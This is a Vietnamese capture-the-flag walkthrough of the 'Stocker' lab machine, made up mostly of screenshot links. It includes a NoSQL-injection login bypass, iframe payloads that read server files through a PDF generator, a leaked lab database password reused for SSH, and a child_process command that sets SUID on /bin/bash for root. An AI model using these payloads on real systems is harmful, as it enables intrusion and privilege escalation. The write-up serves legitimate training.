# stocker

- liệt kê

port mở

![https://lh7-us.googleusercontent.com/z0wSCrYWmMrAooevo78hlRK9f-QADJwjYm5uOLIWseSdLMpGvQGc8WH0kRY3nSUvioLO-NAqTcXjrU6CeBYQ890SFEiQhVsLRZ-uYotpY3padiSANqPp9GMtV8XbqVAHd_Ub3jkT2vaZ](https://lh7-us.googleusercontent.com/z0wSCrYWmMrAooevo78hlRK9f-QADJwjYm5uOLIWseSdLMpGvQGc8WH0kRY3nSUvioLO-NAqTcXjrU6CeBYQ890SFEiQhVsLRZ-uYotpY3padiSANqPp9GMtV8XbqVAHd_Ub3jkT2vaZ)

path ẩn

![https://lh7-us.googleusercontent.com/peW2JXktifpwvD0HP25ubpzwFTdpwnqdajK3mvf8nVP2FibrxnhaaYrbiVWFb9BADgVrKB1EBmD8UhQpk5LN7gA5zGtcBByzeDtEF8YSVVz7x7vnU2kSMaPdIfl-pbU93d9hRj_mTGnf](https://lh7-us.googleusercontent.com/peW2JXktifpwvD0HP25ubpzwFTdpwnqdajK3mvf8nVP2FibrxnhaaYrbiVWFb9BADgVrKB1EBmD8UhQpk5LN7gA5zGtcBByzeDtEF8YSVVz7x7vnU2kSMaPdIfl-pbU93d9hRj_mTGnf)

subdomain

![https://lh7-us.googleusercontent.com/hQGMd7erQ0vFaln8opnmdYA-wHxDEUVuQTfHWAaK4e656rbv4neyHs6KURBggPrr_R8qgFdtiFWtb69aQeDP1qPp13hEvLH5RX9Qlr4XZGhDHBx0M_u_s7UZzShacK7c2u9TudNm3rFz](https://lh7-us.googleusercontent.com/hQGMd7erQ0vFaln8opnmdYA-wHxDEUVuQTfHWAaK4e656rbv4neyHs6KURBggPrr_R8qgFdtiFWtb69aQeDP1qPp13hEvLH5RX9Qlr4XZGhDHBx0M_u_s7UZzShacK7c2u9TudNm3rFz)

truy cập p80 nhưng ko thấy thông tin gì

![https://lh7-us.googleusercontent.com/zJa7A_iW6Vm5gPZCTq6YRkXPtAvOPJrkzE-1RUzzwRZCKVsjH43F_tAXWByv2b70DmpCMJsof86wD9m3jsyhBnh3qUAMsztMlFNrHMlcv1oZxCA0ApfRdftjZh9X0v1BJOki_rjZpLcV](https://lh7-us.googleusercontent.com/zJa7A_iW6Vm5gPZCTq6YRkXPtAvOPJrkzE-1RUzzwRZCKVsjH43F_tAXWByv2b70DmpCMJsof86wD9m3jsyhBnh3qUAMsztMlFNrHMlcv1oZxCA0ApfRdftjZh9X0v1BJOki_rjZpLcV)

truy cập subdomain thấy có form login

![https://lh7-us.googleusercontent.com/MUy6CQ6nulzlzKugaxHbZwd4JZcQo2nUO-MQQtlkUwMRlGqNgITqCExRlRzhadPMv0szUa8fTEvY-SQ8WbtWBFgInlbrNa4WVmTt8mKTKn1PXw62YAd9Op0uMFhUZaBn5txNr4US5FS6](https://lh7-us.googleusercontent.com/MUy6CQ6nulzlzKugaxHbZwd4JZcQo2nUO-MQQtlkUwMRlGqNgITqCExRlRzhadPMv0szUa8fTEvY-SQ8WbtWBFgInlbrNa4WVmTt8mKTKn1PXw62YAd9Op0uMFhUZaBn5txNr4US5FS6)

tìm cách sqli

từ response biết đc dùng nodejs: framework express

![https://lh7-us.googleusercontent.com/IywT3bRqH27twOQSqdgrhfFnKfCv5TN6EkazdmM2m4PALciM3WgGAmq1nX9A9yhtq-MxRXCKrgiFyi2j7ya4FNhZI8ePnWyzRKK48FSkVWbsPLqAOZdkkXfpJiNzjiC4IQlSl7i3TQeF](https://lh7-us.googleusercontent.com/IywT3bRqH27twOQSqdgrhfFnKfCv5TN6EkazdmM2m4PALciM3WgGAmq1nX9A9yhtq-MxRXCKrgiFyi2j7ya4FNhZI8ePnWyzRKK48FSkVWbsPLqAOZdkkXfpJiNzjiC4IQlSl7i3TQeF)

Các ứng dụng Express cũng có xu hướng sử dụng các giải pháp NoSQL như MongoDB -> kiểm tra nosql injection (hacktricks)

![https://lh7-us.googleusercontent.com/6BjC2-zJuKfzWdse2P22yEFukU-lMUM2VAuCuQtYg81Zz8i30cLgSdCAqBvTHG5HpLJYZBy54U_yAA5-rmXBDwqIyrFlVAzKlqFVn7-fo9sWQaxZblcl9HjYvp1wtjZpw5vr6DtT86zY](https://lh7-us.googleusercontent.com/6BjC2-zJuKfzWdse2P22yEFukU-lMUM2VAuCuQtYg81Zz8i30cLgSdCAqBvTHG5HpLJYZBy54U_yAA5-rmXBDwqIyrFlVAzKlqFVn7-fo9sWQaxZblcl9HjYvp1wtjZpw5vr6DtT86zY)

chuyển content-type thành application/json và body request như sau:

{"username": {"$ne": null}, "password": {"$ne": null} }

![https://lh7-us.googleusercontent.com/dQ5-6OBn46lhjfNyjDIfD_potkcjEnJuekyJZEX7Aic2uokotP_xOwztItH6KT4sltXhZZiiDJ7Tck4yauqfPM542zx4WRg5MGiUJ8cBsxfHz0MGxd5loRvoPjSzHir699xHQIcoKrx_](https://lh7-us.googleusercontent.com/dQ5-6OBn46lhjfNyjDIfD_potkcjEnJuekyJZEX7Aic2uokotP_xOwztItH6KT4sltXhZZiiDJ7Tck4yauqfPM542zx4WRg5MGiUJ8cBsxfHz0MGxd5loRvoPjSzHir699xHQIcoKrx_)

→ truy cập được /stock

![https://lh7-us.googleusercontent.com/9PBf1MW2gUSdarBEe0VMLnh7TH_Y47p8CB-HOmm0XQhgqGV6-5HbeER2Bz5Ldb9Y4b1MUcGlr-MvA0Xzd9389DPUkgWgFZaI_ENxAcwa0Dr4n4OjSL3mhGuR90iBlcKxGpfXHUOn0CB6](https://lh7-us.googleusercontent.com/9PBf1MW2gUSdarBEe0VMLnh7TH_Y47p8CB-HOmm0XQhgqGV6-5HbeER2Bz5Ldb9Y4b1MUcGlr-MvA0Xzd9389DPUkgWgFZaI_ENxAcwa0Dr4n4OjSL3mhGuR90iBlcKxGpfXHUOn0CB6)

![https://lh7-us.googleusercontent.com/URkKj0k4fMnUq8_k4JtYtkt3u9EfCkOgHedpbZ6BOEQVvwIJzvtthnYrEU5SjhCc2pvLdtJXvh9oJUg1i86yqi-8lnFJWfDN2tm4YXP5FSa9vSOk8oL7a2F_FPHyfkV2bT-7sAC_JpQf](https://lh7-us.googleusercontent.com/URkKj0k4fMnUq8_k4JtYtkt3u9EfCkOgHedpbZ6BOEQVvwIJzvtthnYrEU5SjhCc2pvLdtJXvh9oJUg1i86yqi-8lnFJWfDN2tm4YXP5FSa9vSOk8oL7a2F_FPHyfkV2bT-7sAC_JpQf)

khi chọn submit purchase sẽ có 1 file pdf đc tạo, trong đó có đầy đủ thông tin của đơn hàng

kiểm tra metadata file pdf dùng exiftool hoặc request

![https://lh7-us.googleusercontent.com/4Y_BPHkL12gUZpAOK4lNT2rRtmVYFLrvNlfcgRa9wWAfLjGzPukJgtHZ5jE9EWTQh4I2DjYYIcXtix3PqCH7mYvkhIj2tBKW0XsNo6bshNiKTIWz6NZVKrqwTf2wCn4ujK5Re00sTrGm](https://lh7-us.googleusercontent.com/4Y_BPHkL12gUZpAOK4lNT2rRtmVYFLrvNlfcgRa9wWAfLjGzPukJgtHZ5jE9EWTQh4I2DjYYIcXtix3PqCH7mYvkhIj2tBKW0XsNo6bshNiKTIWz6NZVKrqwTf2wCn4ujK5Re00sTrGm)

tìm kiếm skia/pdf m108 vulnerability: cho phép thực thi mã JavaScript (xss)

có thể render html tag

![https://lh7-us.googleusercontent.com/e-6bPRNP_P2kr93cbRAUwji-80sp-sPC9n4wD0514Ija4Q7mfUYFboW1o_Qghc9Svj_hHd_TYFHREzAl_gUnMOfCRC1n9GfIKeimIoeesmIfN6dhZpEaL4QHcmvuifYVq1FqH2K7F_eo](https://lh7-us.googleusercontent.com/e-6bPRNP_P2kr93cbRAUwji-80sp-sPC9n4wD0514Ija4Q7mfUYFboW1o_Qghc9Svj_hHd_TYFHREzAl_gUnMOfCRC1n9GfIKeimIoeesmIfN6dhZpEaL4QHcmvuifYVq1FqH2K7F_eo)

![https://lh7-us.googleusercontent.com/3jcg2v1R0OElDZf6eePOJabCzxxaM3ogiqJ_jFG5TQwXk9KtygVKMsoco3TWdjU1ldVLBZIw0sz1DUjtfX02KEEuBNF3vMw7ojvx3v4N45bSl7ofeQlwILQlnjYBIZAnfA8y7xucKL0X](https://lh7-us.googleusercontent.com/3jcg2v1R0OElDZf6eePOJabCzxxaM3ogiqJ_jFG5TQwXk9KtygVKMsoco3TWdjU1ldVLBZIw0sz1DUjtfX02KEEuBNF3vMw7ojvx3v4N45bSl7ofeQlwILQlnjYBIZAnfA8y7xucKL0X)

dùng iframe -> có nhiều không gian hiển thị hơn và có thể thực thi như đọc file

![https://lh7-us.googleusercontent.com/Iyw-icdKNAZbjm5a5VrHjGOmmxFCZ4xrRMtcWWfQF_3IinsjsYPgOqV1W9BRwBpJsh9Jvz-absU88wqCf6KOda13ZDrBsU_dh2TfZwamus6e0Zf-1y4DcAq22v_p72qvGkdO8MFON2wq](https://lh7-us.googleusercontent.com/Iyw-icdKNAZbjm5a5VrHjGOmmxFCZ4xrRMtcWWfQF_3IinsjsYPgOqV1W9BRwBpJsh9Jvz-absU88wqCf6KOda13ZDrBsU_dh2TfZwamus6e0Zf-1y4DcAq22v_p72qvGkdO8MFON2wq)

thấy có user angoose

![https://lh7-us.googleusercontent.com/thJenrNVn9-YlWtCETM2fbztN1qziVW5ZBtkMxSLIwZHrBY0dL9xhIxqnK-9ZfMTYuzWp-euRrO0LoolXIkMVXv0Q-4EhfojOVPmB5FobeyrDwoOg2lfe56lMNaEyT6YKJ_yWF0_7sB8](https://lh7-us.googleusercontent.com/thJenrNVn9-YlWtCETM2fbztN1qziVW5ZBtkMxSLIwZHrBY0dL9xhIxqnK-9ZfMTYuzWp-euRrO0LoolXIkMVXv0Q-4EhfojOVPmB5FobeyrDwoOg2lfe56lMNaEyT6YKJ_yWF0_7sB8)

<!iframe width=800 height=1200 src='/etc/nginx/nginx.conf'></iframe> 

thấy dev.stocker.htb triển khai từ /var/www/dev

![https://lh7-us.googleusercontent.com/jJPQsBTV6yB4FD3DB0l0Z6bPEjmFnSDsMuOoImem3UVAmKZFJbz815n7P_TiesZ0DB9zahOx1mN7BcH9Uh-gBYoAC50zrV5Ds2ZX7aSx_jAj-zx8Vc6CHgB4L_vVEjBi-KzIYfjld6mr](https://lh7-us.googleusercontent.com/jJPQsBTV6yB4FD3DB0l0Z6bPEjmFnSDsMuOoImem3UVAmKZFJbz815n7P_TiesZ0DB9zahOx1mN7BcH9Uh-gBYoAC50zrV5Ds2ZX7aSx_jAj-zx8Vc6CHgB4L_vVEjBi-KzIYfjld6mr)

khi sửa sai 1 giá trị bên request /api/order thì thấy thông báo lỗi có liên quan index.js

![https://lh7-us.googleusercontent.com/-dNarwBaHxZAa6W8dfFdPDJHyxZFmEvGPTNSqmDMgDmRm7BVOiEe3KFhTpngk1l07_g22BVelcSb-Zy71QEb6pQNBAWjkfjJ0Wy3kvYeAbVgyCKzA80f_g8oWtFXo0jLdeWg4pRRYRPk](https://lh7-us.googleusercontent.com/-dNarwBaHxZAa6W8dfFdPDJHyxZFmEvGPTNSqmDMgDmRm7BVOiEe3KFhTpngk1l07_g22BVelcSb-Zy71QEb6pQNBAWjkfjJ0Wy3kvYeAbVgyCKzA80f_g8oWtFXo0jLdeWg4pRRYRPk)

<!iframe id='frameID' width=800 height=1000 src='../../../../var/www/dev/index.js'></iframe>

![https://lh7-us.googleusercontent.com/AwoWk5fLx98JcXFw8DR5Y9Jt8Bnok002GxUTPiI7am9Es8qUN44grz79b2IVjeVQr_RLghhW61LxeFuhQKXi6ndj_j7SWyJWAJMvsIzUEm4hCOhTM6HUVTIuRB7FN5swtfHOl9SSx-lH](https://lh7-us.googleusercontent.com/AwoWk5fLx98JcXFw8DR5Y9Jt8Bnok002GxUTPiI7am9Es8qUN44grz79b2IVjeVQr_RLghhW61LxeFuhQKXi6ndj_j7SWyJWAJMvsIzUEm4hCOhTM6HUVTIuRB7FN5swtfHOl9SSx-lH)

mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1

![https://lh7-us.googleusercontent.com/xE0mH8QgyI-0zTkOdzFQB78xaGdc5tCELc0xUrfYtxtOLATvhiQFBGaag9xCn87XNDh3mDhdK4At2IKB2oC529-9WS54EW7iJ4nbqJuxiVMqBgb0M_97eHJuNFgJ57-V51zIR5r5vFfa](https://lh7-us.googleusercontent.com/xE0mH8QgyI-0zTkOdzFQB78xaGdc5tCELc0xUrfYtxtOLATvhiQFBGaag9xCn87XNDh3mDhdK4At2IKB2oC529-9WS54EW7iJ4nbqJuxiVMqBgb0M_97eHJuNFgJ57-V51zIR5r5vFfa)

ssh angoose với pw IHeardPassphrasesArePrettySecure

![https://lh7-us.googleusercontent.com/I-l4PNLcfsqvs6Jqx5ck5Dq37r9Dg8cscx-u1PJFvEjM3827GD8fdDv5zAilrIi4Izu0FRCc2pvMJB0B5jXS3AaeK0Sj7g1p723yPi4QHCHCrK7tQEoGEOmVihSGz3xOp8JQQj4FfPfS](https://lh7-us.googleusercontent.com/I-l4PNLcfsqvs6Jqx5ck5Dq37r9Dg8cscx-u1PJFvEjM3827GD8fdDv5zAilrIi4Izu0FRCc2pvMJB0B5jXS3AaeK0Sj7g1p723yPi4QHCHCrK7tQEoGEOmVihSGz3xOp8JQQj4FfPfS)

xem có quyền đc truy cập ở những đâu

![https://lh7-us.googleusercontent.com/Pmxq54WpRxsZB-y3m53Q76LPmgXZo_5YDP64m-Pp2pUD0p1v9fbzCvjG-lBFPdo-VUmVU2rRMzlFc1lPQUIx08diQaZ-VBDL43j8kub8oJh4ChcfP3ZNhJdlbwT1t_fkih1XKtM2CBnc](https://lh7-us.googleusercontent.com/Pmxq54WpRxsZB-y3m53Q76LPmgXZo_5YDP64m-Pp2pUD0p1v9fbzCvjG-lBFPdo-VUmVU2rRMzlFc1lPQUIx08diQaZ-VBDL43j8kub8oJh4ChcfP3ZNhJdlbwT1t_fkih1XKtM2CBnc)

angoose có thể thực thi js trong /usr/local/script dưới quyền sudo

![https://lh7-us.googleusercontent.com/hGgnNu-Uzjope_qi7oIl1G8OKcP8vUcwGes_ZO_HkQb9-hSDnAYhZyNCzmEs8YkF1BxNWlrlqQ0tibDP453oLnMCIDMmbOpdRN8j6G9gODJmjAPKq9vDw2VcqEQ-5UhBGIoABYMzwPHK](https://lh7-us.googleusercontent.com/hGgnNu-Uzjope_qi7oIl1G8OKcP8vUcwGes_ZO_HkQb9-hSDnAYhZyNCzmEs8YkF1BxNWlrlqQ0tibDP453oLnMCIDMmbOpdRN8j6G9gODJmjAPKq9vDw2VcqEQ-5UhBGIoABYMzwPHK)

![https://lh7-us.googleusercontent.com/2xteC51-moyygLt7Rde7Hl4qpi2M3nq381m_Z58X8yF3tfS_VoFmt01SL7tiUe6aqDKSb3pVJmZoOwsot_ISzH0aViJONjDsg5-bVwcc7eCS7N7fVO4fKSmrEpvM7PFLWA0kK9EwQDy5](https://lh7-us.googleusercontent.com/2xteC51-moyygLt7Rde7Hl4qpi2M3nq381m_Z58X8yF3tfS_VoFmt01SL7tiUe6aqDKSb3pVJmZoOwsot_ISzH0aViJONjDsg5-bVwcc7eCS7N7fVO4fKSmrEpvM7PFLWA0kK9EwQDy5)

tạo file g.js với nd script để copy file bash với quyền root và suid  để run as root:

require('child_process').exec('#!/bin/bash\nchmod u+s /bin/bash')

![https://lh7-us.googleusercontent.com/RXwN8gMKU44y1TGpxOvGChi-AHhizYWmnQJCW2CVNhUGUTyShr51fgnX1lSJ4CxXAqQC8dPZ5E_Jrrg8iylRs9r_llsSsz8TBAKFXEOWxstdG3qSY3YvDO5j6TZTjfVtXv1jyfhP0ixU](https://lh7-us.googleusercontent.com/RXwN8gMKU44y1TGpxOvGChi-AHhizYWmnQJCW2CVNhUGUTyShr51fgnX1lSJ4CxXAqQC8dPZ5E_Jrrg8iylRs9r_llsSsz8TBAKFXEOWxstdG3qSY3YvDO5j6TZTjfVtXv1jyfhP0ixU)